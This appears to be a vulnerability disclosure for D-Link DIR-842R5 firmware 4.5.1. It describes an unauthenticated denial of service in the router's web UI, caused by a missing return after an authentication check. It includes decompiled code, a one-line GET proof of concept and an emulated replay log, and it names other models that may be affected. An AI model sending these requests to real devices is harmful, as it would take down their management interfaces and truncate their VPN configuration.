## DIR-842R5 Vulnerability

Vendor:D-Link

Product:DIR-842R5 (Russia/CIS "deuteron" software train, RT8197G)

Version:4.5.1 (build 2025.06.10, file `2025.06.10-13.39_DIR_842R5_RT8197G_NON4RU_4.5.1_release.bin`, sha256 1537cd96853989326ba95cfe1263abcb4ec662ec4f69dcc87c4eeda8172159fc)

Download:https://dlink.ru → DIR-842R5 → firmware 4.5.1

Vulnerability:Unauthenticated Remote Denial of Service of the management Web UI — CWE-285 (authorization check without termination) + CWE-20

Author:Chauncy-lab

## Descriptions

We found an unauthenticated single-packet DoS in `anweb`, the civetweb-1.15-based web front end of D-Link DIR-842R5 4.5.1.

The handlers of `/amneziawg_import` (and the type-identical `/openvpn_import` @ 0x423c40) check authentication, send a denial response — **but forget the `return`**, so control *falls through* into the upload-and-import path (`amneziawg_import_end_point` @ 0x424344, IDA 9.1 pseudocode):

```c
int __fastcall amneziawg_import_end_point(int a1)
{
  ...
  _BYTE s[132]; // [sp+20h] [-84h] BYREF

  memset(s, 0, 0x80u);
  s_2 = *(const char **)(mg_get_request_info(a1) + 20);   // query string (NULL if absent)
  ...
  dmsd_context = get_dmsd_context(a1, 1);
  if ( check_auth(dmsd_context) )                         // unauthenticated requests take this branch
  {
    print_amneziawg_response_start(a1, "200 OK");
    print_amneziawg_response_error(a1, 10005, "Request denied");
    amneziawg_end_finally(0, dmsd_context);
    // <-- BUG: NO return here — denial branch falls through into upload+import
  }
  stream = (FILE *)fopen64("/tmp/amnezia_config", "wb");  // unconditionally truncates VPN config
  if ( !stream )
    amneziawg_error_output(a1, 9001, "Upload failed", 0, dmsd_context);   // also no return
  if ( upload_file(a1, 10485760, amneziawg_dump_predicat, stream) )       // GET has no body -> fails
    amneziawg_error_output(a1, 9001, "Upload failed", stream, dmsd_context);
  fclose(stream);
  n20015 = amneziawg_import(dmsd_context, s);             // parses just-emptied config -> crash
  ...
}
```

Three defects stack up on the fall-through path:

1. the auth-denial branch already emitted the `10005 Request denied` response, then execution continues;
2. `fopen64("/tmp/amnezia_config", "wb")` unconditionally truncates the Amnezia VPN client configuration — collateral configuration destruction for any authenticated user;
3. with a GET request `upload_file()` fails (9001 "Upload failed"), yet `amneziawg_import()` still parses the now-empty configuration file and the process dies with a core dump.

That is why a single unauthenticated GET receives **two HTTP responses on one connection** (`10005` + `9001`), and why the web UI is dead a moment later. Reproduction is 100% stable (5/5 on a pristine environment, re-confirmed independently on a fresh environment); the anweb process disappears, a ~10 MB MIPS core (`qemu_anweb_*.core`) is written, and the management UI stays down until manually restarted. On the device the DMSD management channel entrance is thereby remotely killable by any LAN host with one packet, repeatedly.

Suggested CVSS v3.1: `AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H` (~6.6: full management-UI outage + VPN-config truncation).

No CVE exists for DIR-842R5 (the model has zero public CVE records; the `amneziawg_import`/`openvpn_import` endpoints appear in no database). The same deuteron code train ships in ~22 other D-Link RU models (830M/841E/842F/842R7/X1510/X1530/1260/843B/853R3/X1860 …) which are expected to be affected alike.

## Proof of Concept (PoC) — verbatim replay capture (2026-11-13)

Single unauthenticated packet — no Cookie, no credentials, no body.

**Request (51 bytes):**

```text
GET /amneziawg_import HTTP/1.0
Host: 127.0.0.1
```

**Response (210 bytes — TWO complete HTTP responses on ONE connection):**

```text
HTTP/1.1 200 OK
Content-Type: application/json

{"error": {"code": 10005, "message": "Request denied"}}HTTP/1.1 200 OK
Content-Type: application/json

{"error": {"code": 9001, "message": "Upload failed"}}
```

The first part (`10005 Request denied`) is the auth denial; execution then falls through the missing `return` and the second part (`9001 Upload failed`) is appended — the doubled response *is* the bug's signature. A few seconds later the web UI is dead (verified below). `GET /openvpn_import` (49 bytes, same 210-byte double response) behaves identically.

## Overcome

Fresh full replay on 2026-11-13 against the emulation container `verify_0146_d842r5` (deuteron backend + stock `anweb` under qemu-mipsel, port 8146; container clock is UTC; qemu stamps core filenames with the firmware's GMT+3 clock — hence `090415` in the filename vs `06:04` in `ls`). Each step lists the **executed command(s)** and their **verbatim output** in separate blocks.

**Step 1 — cores deleted, service stack restarted before the run**

Command:

```sh
docker exec verify_0146_d842r5 sh -c 'rm -f /qemu_arm/work/*.core'
docker exec verify_0146_d842r5 sh /tmp/restart2.sh
```

Output (of the second command):

```text
rm: cannot remove '/qemu_arm/work/tmp/var/run/tracer': Is a directory
version.json: {"build":"Tue Jun 10 14:03:02 GMT+3 2025","buildUnix":174955
cores: 0
```

(the `tracer` line is a harmless leftover directory in the run-state cleanup; `cores: 0` confirms a clean slate.)

**Step 2 — baseline: the web UI is alive before the attack**

Command:

```sh
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8146/devinfo
```

Output:

```text
200
```

**Step 3 — send the GET shown in the PoC section above; ~3 s later the web UI is dead and a core is dropped**

Command:

```sh
sleep 3 && curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8146/devinfo
docker exec verify_0146_d842r5 sh -c 'ls -la /qemu_arm/work/*.core'
docker exec verify_0146_d842r5 sh -c 'file /qemu_arm/work/qemu_anweb_*.core'
```

Output (in command order):

```text
000
-rw-r--r-- 1 root root 10485760 Nov 13 06:04 /qemu_arm/work/qemu_anweb_20261113-090415_2891.core
/qemu_arm/work/qemu_anweb_20261113-090415_2891.core: ELF 32-bit LSB core file MIPS, MIPS-I version 1 (SYSV), SVR4-style
```

(`000` = connection refused: the `anweb` process is gone; its ~10 MB MIPS core dump is on disk.)

**Step 4 — manual restart recovers the UI; the second endpoint kills it identically**

Command:

```sh
docker exec verify_0146_d842r5 sh /tmp/restart_anweb.sh
```

Output:

```text
version.json: {"build":"Tue Jun 10 14:03:02 GMT+3 2025
```

Then send `GET /openvpn_import` (49 bytes — the same 210-byte double response shown in the PoC section). After it:

Command:

```sh
sleep 3 && curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8146/devinfo
docker exec verify_0146_d842r5 sh -c 'ls /qemu_arm/work/*.core | wc -l'
```

Output (in command order):

```text
000
2
```
